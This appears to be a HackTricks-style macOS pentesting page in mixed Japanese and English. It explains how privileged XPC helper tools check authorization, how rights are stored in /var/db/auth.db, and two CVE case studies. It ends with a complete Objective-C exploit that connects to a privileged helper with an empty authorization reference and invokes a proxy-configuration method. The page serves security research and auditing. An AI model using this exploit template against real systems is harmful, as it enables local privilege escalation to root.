# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Apple は、接続するプロセスが **公開された XPC メソッドを呼び出す権限** を持っている場合に認証する別の方法も提案しています。

アプリケーションが **特権ユーザとしてアクションを実行する** 必要がある場合、アプリ自体を特権ユーザとして実行する代わりに、通常は root として HelperTool を XPC サービスとしてインストールし、アプリからそのサービスを呼び出して操作を行います。ただし、サービスを呼び出すアプリは十分な authorization を持っているべきです。

### ShouldAcceptNewConnection は常に YES

例は [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample) にあります。`App/AppDelegate.m` では **connect** を試みて **HelperTool** に接続します。そして `HelperTool/HelperTool.m` では関数 **`shouldAcceptNewConnection`** が前述の要件のいずれも **チェックしません**。この関数は常に YES を返します:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
For more information about how to properly configure this check:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### アプリケーション権限

ただし、HelperTool のメソッドが呼び出される際に何らかの**認可が行われています**。

`App/AppDelegate.m` の関数 **`applicationDidFinishLaunching`** はアプリ起動後に空の authorization reference を作成します。これは常に動作するはずです。\
その後、`setupAuthorizationRights` を呼び出してその authorization reference に**いくつかの権限を追加しようとします**:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Common/Common.m の関数 `setupAuthorizationRights` は、アプリケーションの権限を auth データベース ` /var/db/auth.db` に格納します。データベースにまだ存在しない権限のみを追加する点に注意してください:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
関数 `enumerateRightsUsingBlock` は、アプリケーションの権限を取得するために使用されるもので、これらは `commandInfo` に定義されています:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
This means that at the end of this process, the permissions declared inside `commandInfo` will be stored in `/var/db/auth.db`. Note how there you can find for **each method** that will r**equire authentication**, **permission name** and the **`kCommandKeyAuthRightDefault`**. The later one **indicates who can get this right**.

これはこの処理の最後に、`commandInfo` 内で宣言された権限が `/var/db/auth.db` に格納されることを意味します。そこでは、**各メソッド**について、**認証を必要とするもの**、**permission name**、および **`kCommandKeyAuthRightDefault`** を確認できます。後者はその権利を**誰が取得できるか**を示します。

There are different scopes to indicate who can access a right. Some of them are defined in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), but as summary:

ある権利に誰がアクセスできるかを示すさまざまなスコープがあります。そのいくつかは [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) に定義されており（you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)）、要約すると:

<table><thead><tr><th width="284.3333333333333">名前</th><th width="165">値</th><th>説明</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>誰でも</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>誰も</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>現在のユーザーは管理者（admin グループ内）である必要がある</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>ユーザーに認証を求める</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>ユーザーに認証を求める。管理者（admin グループ内）である必要がある</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>ルールを指定する</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>その権利に関する追加コメントを指定する</td></tr></tbody></table>

### Rights Verification

In `HelperTool/HelperTool.m` the function **`readLicenseKeyAuthorization`** checks if the caller is authorized to **execute such method** calling the function **`checkAuthorization`**. This function will check the **authData** sent by the calling process has a **correct format** and then will check **what is needed to get the right** to call the specific method. If all goes good the **returned `error` will be `nil`**:

`HelperTool/HelperTool.m` の関数 **`readLicenseKeyAuthorization`** は、呼び出し元がそのメソッドを実行する権限を持っているかを **`checkAuthorization`** を呼び出して確認します。`checkAuthorization` は呼び出しプロセスが送信した **authData** が**正しい形式**であるかを検証し、続いて特定のメソッドを呼び出すために**何が必要か**を確認します。すべてが問題なければ、**返される `error` は `nil` になります**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Note that to **権利を得るための要件を確認する** to call that method the function `authorizationRightForCommand` will just check the previously comment object **`commandInfo`**. Then, it will call **`AuthorizationCopyRights`** to check **権限があるかどうか** to call the function (note that the flags allow interaction with the user).

In this case, to call the function `readLicenseKeyAuthorization` the `kCommandKeyAuthRightDefault` is defined to `@kAuthorizationRuleClassAllow`. So **誰でも呼び出せます**。

### DB Information

この情報は `/var/db/auth.db` に保存されていると述べられていました。保存されているすべてのルールは次のコマンドで一覧表示できます：
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
次に、その権限に誰がアクセスできるかを次のコマンドで確認できます:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### 許容的な権限

**すべての権限設定**は[**in here**](https://www.dssw.co.uk/reference/authorization-rights/)で確認できますが、ユーザーの操作を必要としない組み合わせは次のとおりです：

1. **'authenticate-user': 'false'**
- これは最も直接的なキーです。`false` に設定されている場合、ユーザーはこの権利を得るために認証を提供する必要がないことを指定します。
- これは**以下の2つのいずれかとの組み合わせ、またはユーザーが属すべきグループを示す場合に使用されます。**
2. **'allow-root': 'true'**
- ユーザーが rootユーザー（権限が昇格したユーザー）として操作しており、このキーが `true` に設定されている場合、rootユーザーは追加の認証なしにこの権利を得る可能性があります。ただし、通常、rootユーザーの状態になるには既に認証が必要であるため、ほとんどのユーザーにとってこれは「認証なし」のシナリオにはなりません。
3. **'session-owner': 'true'**
- `true` に設定されている場合、セッションの所有者（現在ログインしているユーザー）が自動的にこの権利を取得します。ユーザーが既にログインしている場合、追加の認証を回避する可能性があります。
4. **'shared': 'true'**
- このキー自体は認証なしで権利を付与するものではありません。代わりに、`true` に設定されている場合、一度権利が認証されると、各プロセスが再認証することなく複数のプロセス間で共有できることを意味します。ただし、最初の権利付与は、`'authenticate-user': 'false'` のような他のキーと組み合わせない限り、引き続き認証を必要とします。

興味深い権利を取得するには[**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9)を使用できます：
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Authorization Bypass ケーススタディ

- **CVE-2024-4395 – Jamf Compliance Editor helper**: 監査を実行すると `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist` を設置し、Mach service `com.jamf.complianceeditor.helper` を公開し、`-executeScriptAt:arguments:then:` をエクスポートしますが、呼び出し元の `AuthorizationExternalForm` やコード署名を検証していません。単純な exploit は空の参照を `AuthorizationCreate` し、`[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` で接続してそのメソッドを呼び出すことで、任意のバイナリを root として実行できます。詳細なリバースノート（および PoC）は [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html) を参照してください。
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 および 7.4.0–7.4.2 は、権限チェックのない privileged helper に届く細工された XPC messages を受け入れていました。その helper が自身の privileged `AuthorizationRef` を信頼していたため、サービスにメッセージを送れるローカルユーザは、任意の設定変更やコマンドを root として実行させるよう強制できました。詳細は [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/) を参照してください。

#### 迅速トリアージのヒント

- アプリが GUI と helper の両方を同梱している場合、両者の code requirements の差分を確認し、`shouldAcceptNewConnection` がリスナーを `-setCodeSigningRequirement:` でロックしているか（または `SecCodeCopySigningInformation` を検証しているか）をチェックしてください。これらのチェックが欠けていると、Jamf のケースのような CWE-863 のシナリオが発生することが多いです。簡単な確認例は次のとおり:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- helper が *認可していると思っているもの* と client が提供するものを比較する。リバースするときは `AuthorizationCopyRights` でブレークし、`AuthorizationRef` が helper の独自の特権コンテキストではなくクライアント提供の `AuthorizationCreateFromExternalForm` に由来していることを確認する。そうでない場合、上記のケースに類似した CWE-863 パターンを発見した可能性が高い。

## Authorization のリバースエンジニアリング

### EvenBetterAuthorization が使われているか確認する

If you find the function: **`[HelperTool checkAuthorization:command:]`** it's probably the the process is using the previously mentioned schema for authorization:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Thisn, if this function is calling functions such as `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, it's using [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Check the **`/var/db/auth.db`** to see if it's possible to get permissions to call some privileged action without user interaction.

### プロトコル通信

Then, you need to find the protocol schema in order to be able to establish a communication with the XPC service.

The function **`shouldAcceptNewConnection`** indicates the protocol being exported:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

In this case, we have the same as in EvenBetterAuthorizationSample, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

使用されているプロトコル名が分かれば、**ヘッダ定義をダンプ**することが可能である：
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
最後に、通信を確立するためには、**公開された Mach Service の名前**を知るだけで十分です。これを見つける方法はいくつかあります：

- **`[HelperTool init]`** の中で、Mach Service が使用されているのが見えます：

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- launchd plist の中でも確認できます：
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit の例

この例では次のものを作成します：

- 関数を含むプロトコルの定義
- アクセスを要求するための空の auth
- XPCサービスへの接続
- 接続が成功した場合の関数呼び出し
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## その他の悪用された XPC privilege helpers

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## 参考

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)

{{#include ../../../../../banners/hacktricks-training.md}}
